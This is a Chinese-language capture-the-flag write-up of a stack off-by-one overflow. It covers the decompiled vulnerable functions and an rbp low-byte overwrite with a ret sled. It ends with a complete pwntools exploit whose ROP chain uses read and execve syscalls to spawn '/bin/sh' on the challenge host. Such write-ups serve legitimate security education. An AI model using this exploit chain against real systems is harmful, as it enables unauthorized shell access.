## off-by-one
这道题是单字节溢出漏洞，这个漏洞大多数是在堆上进行考查，栈上的不多，而这里这道题目就是在栈上的利用。

__漏洞点__:

```
__int64 sub_400BD2()
{
  int v0; // eax
  char buf; // [rsp+2h] [rbp-Eh]
  char v3; // [rsp+Bh] [rbp-5h]
  int v4; // [rsp+Ch] [rbp-4h]

  sub_410C30("how much do you have to say?");
  sub_44A140(0, &buf, 9uLL);  //把v0或者v4读入存入rax
  v3 = 0;
  sub_40DD00((__int64)&buf); //buf进行异或操作，相当于把buf清零
  v4 = v0;
  if ( v0 <= 0 )
    return sub_410C30("That's not much to say.");
  if ( v4 <= 257 )  //v4<=0x101，最大值可取0x101
    return sub_400B73(v4);
  return sub_410C30("That's too much to say!.");
}
```
当输入的v4满足条件，即可进入sub_400b73(),看一下这个函数是干嘛的。

```
__int64 __fastcall sub_400B73(int a1)
{
  char buf; // [rsp+10h] [rbp-100h]

  buf = 0;
  sub_410C30("Ok, what do you have to say for yourself?");
  sub_44A140(0, &buf, a1);  //读a1个字节到buf，其中a1就是上边的v4，这里他可以取0x101，而buf的大小为0x100，就可以造成一个字节的溢出。
  return sub_40FFB0((unsigned __int64)"Interesting thought \"%s\", I'll take it into consideration.\n");
}
```

__利用漏洞__：

溢出的那一个字节可以覆盖ebp的最后一个字节，这里这个字节取多少，我们是可以控制的，如果我们用0x00来覆盖，如果原先的ebp是0xffffff30，当运行上述程序后
（造成单字节溢出漏洞后）即0xffffff30变成0xffffff00。那么我们是不是可以利用对这一个字节的修改而修改程序的执行？答案是可以的。可以使覆盖后的ebp指向
我们能控制的区域，这个区域在这里就是buf。就可以在buf中进行构造，执行我们想要程序执行的指令。</br>
【例】如果buf的起始地址为0xdcf0，ebp的内容为0xddf0，那么程序执行单字节溢出后（这里输入257即可造成单字节溢出漏洞），ebp就变成了0xdd00，就指到了buf
的区域，那么我们就可以从指向的地址开始构造我们的exp，这里用到了系统调用，可以通过调用system函数来获取程序shell。</br>
但是，通过调试，发现ebp的地址总是在变，有的时候覆盖后，指不到buf区域，还有如果指到了buf区域，指向的地址也在变，那么我们根据指向的地址进行构造的exp，
执行成功的概率就很低，那么我们怎么取解决这一变化，使得我们的执行的exp最大概率的运行成功。</br>

__NOP slide__: 我们怎么让程序运行到我们构造的exp那里？有一种技术叫NOP slide，即在写的exp前用大量的NOP填充，由于NOP是一条不会改变上下文的空指令，
因此执行完一堆NOP指令后，对exp的功能没有什么影响，且可以增加地址猜测范围，从一定程度上对抗ASLR，这里我们同样可以用ret指令不停的“滑”到下一条指令，总会
滑到我们构造的exp上。

## exp

```
from pwn import *
#context(os='linux', arch='amd64', log_level='debug')
p = remote("vps1.blue-whale.me",19903)

pop_rdi=0x0000000000400686
pop_rsi=0x0000000000410a93
pop_rdx=0x000000000044a155
pop_rax=0x0000000000415f04

bss_addr = 0x00000000006BC821
syscall_addr=0x0000000000474f15
main_addr=0x0000000000400BD2

ret_addr =0x0000000000400416

p.recvuntil("how much do you have to say?")
p.send("257")


payload = p64(ret_addr)*13           

payload += p64(pop_rdi)+p64(0)   
payload += p64(pop_rsi)+p64(bss_addr) 
payload += p64(pop_rdx)+p64(8)   
payload += p64(pop_rax)+p64(0)   
payload += p64(syscall_addr)         


payload += p64(pop_rdi)+p64(bss_addr)   
payload += p64(pop_rsi)+p64(0)     
payload += p64(pop_rdx)+p64(0)     
payload += p64(pop_rax)+p64(59)    
payload += p64(syscall_addr)           

payload += 'a'*8
#payload += p64(main_addr)        
payload += p8(0x00)                

p.recvuntil("Ok, what do you have to say for yourself?")
p.send(payload)
p.recvuntil("I'll take it into consideration.\n")
p.send("/bin/sh\x00")

p.interactive()
```


